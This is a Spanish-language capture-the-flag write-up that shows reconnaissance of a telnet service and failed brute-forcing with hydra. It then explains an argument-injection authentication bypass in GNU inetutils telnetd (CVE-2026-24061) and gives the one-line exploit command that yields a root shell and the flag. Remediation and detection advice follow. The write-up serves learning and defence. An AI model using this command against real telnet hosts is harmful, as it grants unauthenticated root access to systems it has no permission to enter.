# Insecure shell

| Campo | Detalle |
|---|---|
| **Categoría** | Network |
| **Puntos** | 100 |
| **Evento** | Kernel CTF — AHAU Team |
| **Autor del reto** | Lychi3 |
| **Objetivo** | `100.57.93.164` (AWS EC2) |
| **Descripción** | *"Un servicio de acceso remoto bastante obsoleto...."* |
| **Vulnerabilidad** | Bypass de autenticación en GNU inetutils telnetd — **CVE-2026-24061** |
| **CWE** | CWE-88 (Improper Neutralization of Argument Delimiters in a Command – Argument Injection) |
| **OWASP** | A06:2021 – Vulnerable and Outdated Components |

## 1. Reconocimiento

"Acceso remoto obsoleto" apunta a **Telnet**. Se confirmó con un escaneo completo de puertos TCP:

```text
$ nmap -Pn -p- --min-rate 2000 100.57.93.164
Nmap scan report for ec2-100-57-93-164.compute-1.amazonaws.com (100.57.93.164)
Host is up (0.087s latency).
Not shown: 65533 filtered tcp ports (no-response), 1 filtered tcp ports (host-unreach)
PORT   STATE SERVICE
23/tcp open  telnet
```

El único puerto expuesto es el **23/tcp**.

## 2. Análisis

Al conectar aparece el banner del sistema y un prompt de login:

```text
$ telnet 100.57.93.164
Trying 100.57.93.164...
Connected to 100.57.93.164.
Escape character is '^]'.

Linux 6.18.62-127.179.amzn2023.aarch64 (60a92661cdf0) (pts/2)

60a92661cdf0 login:
```

Del banner se obtiene lo siguiente:

- **Kernel** `6.18.62-...amzn2023.aarch64`: el host es Amazon Linux 2023 sobre ARM (Graviton).
- **Hostname** `60a92661cdf0`: son 12 caracteres hexadecimales, el formato de un ID de contenedor Docker. El servicio corre dentro de un contenedor.
- El login es `/usr/bin/login` estándar, invocado por el demonio `telnetd`.

## 3. Intentos fallidos (fuerza bruta)

Primero se probaron credenciales por defecto a mano, con password vacío:

```text
60a92661cdf0 login: root      -> Login incorrect
60a92661cdf0 login: admin     -> Login incorrect
60a92661cdf0 login: guest     -> Login incorrect
60a92661cdf0 login: lychi3    -> Login incorrect
60a92661cdf0 login: insecure  -> Login incorrect
Maximum number of tries exceeded (5)
Connection closed by foreign host.
```

Después se intentó con `hydra` y listas cortas de combinaciones:

```text
$ hydra -C combo.txt telnet://100.57.93.164 -t 1 -f -I
[STATUS] 1.00 tries/min, 1 tries in 00:01h, 14 to do in 00:15h, 1 active
...
[STATUS] 0.06 tries/min, 5 tries in 01:28h, 3 to do in 00:53h, 1 active
```

La fuerza bruta resultó inviable por tres razones:

| Control | Efecto |
|---|---|
| Retraso tras cada login fallido | ~1 intento/min, bajando a 0.06/min |
| Límite de 5 intentos por conexión | `Maximum number of tries exceeded (5)` |
| Timeout de login de 60 s | `Login timed out after 60 seconds` |

La pista "obsoleto" sugería atacar el **software** y no las credenciales.

## 4. Vulnerabilidad: CVE-2026-24061

GNU inetutils `telnetd` (hasta la versión 2.7-2) tiene un bypass de autenticación:

1. El protocolo Telnet permite que el cliente envíe variables de entorno con la opción **NEW-ENVIRON** (RFC 1572), entre ellas `USER`.
2. `telnetd` toma el valor de `USER` y lo pasa **sin sanitizar** como argumento a `/usr/bin/login`.
3. Si `USER` vale `-f root`, el comando que se ejecuta es:

```text
/usr/bin/login -h <hostname> "-f root"
```

4. Para `login`, el flag `-f` significa *"el usuario ya fue autenticado, no pidas contraseña"*. El resultado es una shell como `root` sin credenciales.

Es una **inyección de argumentos** clásica: un dato controlado por el atacante termina interpretado como opción de línea de comandos.

## 5. Explotación

El cliente `telnet` con `-a` (automatic login) envía la variable `USER` del entorno local mediante NEW-ENVIRON:

```text
$ USER='-f root' telnet -a 100.57.93.164
Trying 100.57.93.164...
Connected to 100.57.93.164.
Escape character is '^]'.

Linux 6.18.62-127.179.amzn2023.aarch64 (60a92661cdf0) (pts/2)

Linux 60a92661cdf0 6.18.62-127.179.amzn2023.aarch64 #2 SMP Wed Nov 11 00:31:16 UTC 2026 aarch64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov 22 17:16:21 UTC 2026 from <redacted> on pts/1
root@60a92661cdf0:~# ls
flag.txt
root@60a92661cdf0:~# cat flag.txt
AHAU{wh0_st1ll_us3s_t3ln3t?}
```

La sesión entra **directamente como root, sin pedir contraseña**. El MOTD confirma que el contenedor es **Debian GNU/Linux**. La bandera está en `/root/flag.txt`.

## 6. Impacto

- **Ejecución remota de código como root sin autenticación.**
- Telnet transmite todo en texto plano, incluidas las credenciales legítimas, que cualquiera en la ruta de red puede capturar.
- Según los reportes públicos del CVE, cerca de 1 millón de dispositivos tienen el puerto 23 abierto en Internet.

## 7. Remediación

- Actualizar `inetutils-telnetd` a una versión corregida, o mejor, **desinstalarlo**.
- Usar **SSH** para acceso remoto.
- Bloquear el puerto 23/tcp en el firewall o Security Group.
- Detección: buscar ejecuciones de `login` con el argumento `-f` cuyo proceso padre sea `telnetd` (Elastic tiene una regla prebuilt para CVE-2026-24061).

```bash
apt purge inetutils-telnetd telnetd
systemctl disable --now inetd xinetd 2>/dev/null
```

## 🚩 Flag

```text
AHAU{wh0_st1ll_us3s_t3ln3t?}
```

## Referencias

- SafeBreach Labs — *Root cause analysis and PoC exploit for CVE-2026-24061*: https://www.safebreach.com/blog/safebreach-labs-root-cause-analysis-and-poc-exploit-for-cve-2026-24061/
- OffSec — *CVE-2026-24061*: https://offsec.com/blog/cve-2026-24061
- Elastic — *Potential Telnet Authentication Bypass (CVE-2026-24061)*: https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-17-potential-telnet-authentication-bypass-cve-2026-24061.html
- RFC 1572 — Telnet Environment Option

---
[⬅ Volver al índice](../../README.md)
